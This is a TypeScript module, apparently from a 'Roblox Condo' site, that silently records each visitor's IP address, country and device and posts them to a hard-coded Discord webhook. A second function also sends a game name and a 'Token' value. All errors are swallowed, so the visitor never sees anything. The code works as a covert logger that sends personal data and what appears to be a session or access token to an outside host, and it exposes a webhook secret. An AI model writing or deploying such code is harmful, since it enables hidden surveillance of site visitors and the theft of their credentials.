const WEBHOOK_URL = 'https://discord.com/api/webhooks/1512921363776536718/I2l7nZKFBkNNu6iU9qTdmztC8nQgfMA8M2-9jLrw-r6busVLb-b_4lnOC10mT14dPSSC';

function getDevice(): string {
  const ua = navigator.userAgent;
  if (/iPhone|iPad|iPod/.test(ua)) return '📱 iOS';
  if (/Android/.test(ua)) return '📱 Android';
  if (/Windows/.test(ua)) return '💻 Windows PC';
  if (/Mac/.test(ua)) return '💻 Mac';
  if (/Linux/.test(ua)) return '🖥 Linux';
  return '❓ Unknown Device';
}

function getCountryFlag(code: string): string {
  if (!code || code.length !== 2) return '🌍';
  return String.fromCodePoint(
    ...code.toUpperCase().split('').map(c => 0x1F1E6 + c.charCodeAt(0) - 65)
  );
}

interface GeoInfo {
  ip: string;
  country: string;
  flag: string;
}

async function getGeo(): Promise<GeoInfo | null> {
  try {
    const res = await fetch('https://ipapi.co/json/');
    const data = await res.json();
    return {
      ip: data.ip ?? 'Unknown',
      country: data.country_name ?? 'Unknown',
      flag: getCountryFlag(data.country_code ?? ''),
    };
  } catch {
    return null;
  }
}

export async function logVisit(): Promise<void> {
  try {
    const geo = await getGeo();
    const timestamp = new Date().toISOString();
    const device = getDevice();
    const ipStr = geo ? `${geo.flag} ${geo.ip} — ${geo.country}` : 'Unknown';

    await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        embeds: [{
          title: 'New Visitor',
          color: 14163750,
          fields: [
            { name: 'IP', value: ipStr, inline: false },
            { name: 'Device', value: device, inline: true },
            { name: 'Time', value: timestamp, inline: true },
          ],
          footer: { text: 'Roblox Condo — Visit Log' },
          timestamp,
        }],
      }),
    });
  } catch {
    // silent
  }
}

export async function logGameAccess(gameName: string, token: string): Promise<void> {
  try {
    const geo = await getGeo();
    const timestamp = new Date().toISOString();
    const device = getDevice();
    const ipStr = geo ? `${geo.flag} ${geo.ip} — ${geo.country}` : 'Unknown';

    await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        embeds: [{
          title: 'Game Access',
          color: 3066993,
          fields: [
            { name: 'IP', value: ipStr, inline: false },
            { name: 'Device', value: device, inline: true },
            { name: 'Time', value: timestamp, inline: true },
            { name: 'Game', value: gameName, inline: true },
            { name: 'Token', value: `\`${token}\``, inline: false },
          ],
          footer: { text: 'Roblox Condo — Game Log' },
          timestamp,
        }],
      }),
    });
  } catch {
    // silent
  }
}
